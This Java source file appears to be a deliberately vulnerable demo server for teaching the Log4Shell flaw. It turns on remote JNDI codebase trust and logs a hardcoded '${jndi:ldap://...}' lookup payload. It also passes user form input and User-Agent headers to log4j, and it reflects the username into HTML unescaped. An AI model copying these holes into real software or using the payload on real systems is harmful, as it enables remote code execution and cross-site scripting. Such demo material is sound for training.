package com.soprasteria.log4shell;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

public class GoatServer {
    public static final String FRONT_PAGE = "<html>" +
                                            "<h1>Welcome to my server</h1>" +
                                            "<div>What's your name?</div>" +
                                            "<form method=POST>" +
                                            "<input name=username>" +
                                            "<button>Submit</button>" +
                                            "</form>" +
                                            "<html>";
    private static final Logger logger = LogManager.getLogger(GoatServer.class);

    public static void main(String[] args) throws IOException {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        String userInput = "${jndi:ldap://127.0.0.1:1389/HelloLog4j}";
        logger.error("this is a thing {}", userInput);

        HttpServer server = HttpServer.create(new InetSocketAddress(30080), 0);
        server.createContext("/", exchange -> {
            try {
                handleRequest(exchange);
            } finally {
                exchange.close();
                logRequest(exchange);
            }
        });
        server.start();
    }

    private static void logRequest(HttpExchange exchange) {
        logger.debug("{} {} {} clientIp={} userAgent={}", exchange.getResponseCode(), exchange.getRequestMethod(), exchange.getRequestURI(), exchange.getRemoteAddress(), exchange.getRequestHeaders().getFirst("User-agent"));
    }

    private static void handleRequest(HttpExchange exchange) throws IOException {
        if (exchange.getRequestMethod().equals("GET")) {
            writeHtmlResponse(exchange, FRONT_PAGE);
        } else if (exchange.getRequestMethod().equals("POST")) {
            Map<String, String> form = getFormBody(exchange);
            String username = form.getOrDefault("username", "Stranger");
            logger.info("Visited by {}", username);
            writeHtmlResponse(
                    exchange,
                    "<html><h1>Welcome to my server</h1><div>Welcome " + username + "</div><html>"
            );
        }
    }

    private static void writeHtmlResponse(HttpExchange exchange, String response) throws IOException {
        exchange.getResponseHeaders().add("Content-Type", "text/html");
        exchange.sendResponseHeaders(200, response.getBytes().length);
        exchange.getResponseBody().write(response.getBytes());
    }

    private static Map<String, String> getFormBody(HttpExchange exchange) throws IOException {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        exchange.getRequestBody().transferTo(buffer);
        Map<String, String> form = new HashMap<>();
        for (String parameter : buffer.toString().split("&")) {
            int equalsPos = parameter.indexOf('=');
            form.put(
                    URLDecoder.decode(parameter.substring(0, equalsPos), StandardCharsets.UTF_8),
                    URLDecoder.decode(parameter.substring(equalsPos + 1), StandardCharsets.UTF_8)
            );
        }
        return form;
    }

}
